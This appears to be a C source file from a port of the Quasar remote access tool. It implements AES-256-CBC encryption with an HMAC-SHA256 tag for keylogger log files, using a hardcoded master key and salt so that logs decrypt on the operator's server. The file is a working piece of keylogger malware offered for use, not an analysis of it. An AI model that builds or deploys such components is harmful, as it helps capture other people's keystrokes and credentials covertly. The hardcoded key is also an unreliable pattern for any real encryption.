/**
 * remote_keylogger_aes.c
 * Keylog file encryption matching C# Quasar.Common.Cryptography.Aes256.
 * Format: [HMAC-SHA256 32][IV 16][AES-256-CBC ciphertext].
 * Key and auth key derived via PBKDF2 (HMAC-SHA1, 50000 it) from master key + salt.
 */
#include "pch.h"
#include "remote_keylogger_aes.h"
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "bcrypt.lib")

#include <bcrypt.h>

#ifndef BCRYPT_CHAIN_MODE_CBC
#define BCRYPT_CHAIN_MODE_CBC L"ChainingModeCBC"
#endif

/* Same salt as Quasar.Common.Cryptography.Aes256 */
static const unsigned char g_salt[32] = {
    0xBF, 0xEB, 0x1E, 0x56, 0xFB, 0xCD, 0x97, 0x3B,
    0xB2, 0x19, 0x02, 0x24, 0x30, 0xA5, 0x78, 0x43,
    0x00, 0x3D, 0x56, 0x44, 0xD2, 0x1E, 0x62, 0xB9,
    0xD4, 0xF1, 0x80, 0xE7, 0xE6, 0xC3, 0x39, 0x41
};

/* Master key (UTF-8). Must match server-side hardcoded string for Aes256. */
static const char g_master_key[] = "KeylogAES256Key01234567890123456";

#define MASTER_KEY_LEN  (sizeof(g_master_key) - 1)
#define AUTH_KEY_LEN    64
#define DERIVED_LEN     (KEYLOG_AES_KEY_BYTES + AUTH_KEY_LEN)

static int derive_keys(unsigned char* key, unsigned char* auth_key) {
    BCRYPT_ALG_HANDLE hPrf = NULL;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hPrf, BCRYPT_SHA1_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (!BCRYPT_SUCCESS(status)) return 0;
    unsigned char derived[DERIVED_LEN];
    status = BCryptDeriveKeyPBKDF2(hPrf, (PUCHAR)g_master_key, (ULONG)MASTER_KEY_LEN, (PUCHAR)g_salt, (ULONG)sizeof(g_salt), 50000, derived, (ULONG)DERIVED_LEN, 0);
    BCryptCloseAlgorithmProvider(hPrf, 0);
    if (!BCRYPT_SUCCESS(status)) return 0;
    memcpy(key, derived, KEYLOG_AES_KEY_BYTES);
    memcpy(auth_key, derived + KEYLOG_AES_KEY_BYTES, AUTH_KEY_LEN);
    return 1;
}

static int compute_hmac_sha256(const unsigned char* key, size_t key_len, const unsigned char* data, size_t data_len, unsigned char* out_hash) {
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_HASH_HANDLE hash = NULL;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (!BCRYPT_SUCCESS(status)) return 0;
    status = BCryptCreateHash(alg, &hash, NULL, 0, (PUCHAR)key, (ULONG)key_len, 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(alg, 0); return 0; }
    status = BCryptHashData(hash, (PUCHAR)data, (ULONG)data_len, 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptDestroyHash(hash); BCryptCloseAlgorithmProvider(alg, 0); return 0; }
    ULONG hash_len = KEYLOG_AES_HMAC_BYTES;
    status = BCryptFinishHash(hash, out_hash, hash_len, 0);
    BCryptDestroyHash(hash);
    BCryptCloseAlgorithmProvider(alg, 0);
    return BCRYPT_SUCCESS(status) ? 1 : 0;
}

int keylog_aes_encrypt(const unsigned char* plain, size_t plain_len, unsigned char* out, size_t* out_len) {
    unsigned char key[KEYLOG_AES_KEY_BYTES], auth_key[AUTH_KEY_LEN];
    if (!derive_keys(key, auth_key)) return 0;

    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE key_handle = NULL;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return 0;
    status = BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(alg, 0); return 0; }
    status = BCryptGenerateSymmetricKey(alg, &key_handle, NULL, 0, key, KEYLOG_AES_KEY_BYTES, 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(alg, 0); return 0; }

    /* IV is written at out+32. BCryptEncrypt modifies the IV buffer, so we must pass a copy
     * so the stored IV stays correct for decryption. */
    unsigned char* iv_stored = out + KEYLOG_AES_HMAC_BYTES;
    unsigned char iv_buf[KEYLOG_AES_IV_BYTES];
    status = BCryptGenRandom(NULL, iv_buf, KEYLOG_AES_IV_BYTES, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    if (!BCRYPT_SUCCESS(status)) { BCryptDestroyKey(key_handle); BCryptCloseAlgorithmProvider(alg, 0); return 0; }
    memcpy(iv_stored, iv_buf, KEYLOG_AES_IV_BYTES);

    ULONG cipher_len = 0;
    unsigned char* cipher = out + KEYLOG_AES_HMAC_BYTES + KEYLOG_AES_IV_BYTES;
    size_t cipher_cap = *out_len - KEYLOG_AES_HMAC_BYTES - KEYLOG_AES_IV_BYTES;
    status = BCryptEncrypt(key_handle, (PUCHAR)plain, (ULONG)plain_len, NULL, iv_buf, KEYLOG_AES_IV_BYTES, cipher, (ULONG)cipher_cap, &cipher_len, BCRYPT_BLOCK_PADDING);
    BCryptDestroyKey(key_handle);
    BCryptCloseAlgorithmProvider(alg, 0);
    if (!BCRYPT_SUCCESS(status)) return 0;

    size_t iv_plus_cipher_len = KEYLOG_AES_IV_BYTES + cipher_len;
    if (!compute_hmac_sha256(auth_key, AUTH_KEY_LEN, iv_stored, iv_plus_cipher_len, out))
        return 0;
    *out_len = KEYLOG_AES_HMAC_BYTES + iv_plus_cipher_len;
    return 1;
}

static int constant_time_compare(const unsigned char* a, const unsigned char* b, size_t len) {
    unsigned char diff = 0;
    for (size_t i = 0; i < len; i++) diff |= a[i] ^ b[i];
    return (diff == 0) ? 1 : 0;
}

int keylog_aes_decrypt(const unsigned char* in, size_t in_len, unsigned char* out, size_t* out_len) {
    const size_t min_len = KEYLOG_AES_HMAC_BYTES + KEYLOG_AES_IV_BYTES;
    if (!in || in_len < min_len || !out || !out_len) return 0;

    unsigned char key[KEYLOG_AES_KEY_BYTES], auth_key[AUTH_KEY_LEN];
    if (!derive_keys(key, auth_key)) return 0;

    unsigned char expected_hmac[KEYLOG_AES_HMAC_BYTES];
    size_t iv_cipher_len = in_len - KEYLOG_AES_HMAC_BYTES;
    if (!compute_hmac_sha256(auth_key, AUTH_KEY_LEN, in + KEYLOG_AES_HMAC_BYTES, iv_cipher_len, expected_hmac))
        return 0;
    if (!constant_time_compare(in, expected_hmac, KEYLOG_AES_HMAC_BYTES))
        return 0;

    const unsigned char* iv = in + KEYLOG_AES_HMAC_BYTES;
    const unsigned char* cipher = in + KEYLOG_AES_HMAC_BYTES + KEYLOG_AES_IV_BYTES;
    size_t cipher_len = in_len - min_len;

    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE key_handle = NULL;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return 0;
    status = BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(alg, 0); return 0; }
    status = BCryptGenerateSymmetricKey(alg, &key_handle, NULL, 0, key, KEYLOG_AES_KEY_BYTES, 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(alg, 0); return 0; }

    ULONG plain_len = 0;
    status = BCryptDecrypt(key_handle, (PUCHAR)cipher, (ULONG)cipher_len, NULL, (PUCHAR)iv, KEYLOG_AES_IV_BYTES, (PUCHAR)out, (ULONG)*out_len, &plain_len, BCRYPT_BLOCK_PADDING);
    BCryptDestroyKey(key_handle);
    BCryptCloseAlgorithmProvider(alg, 0);
    if (!BCRYPT_SUCCESS(status)) return 0;
    *out_len = plain_len;
    return 1;
}
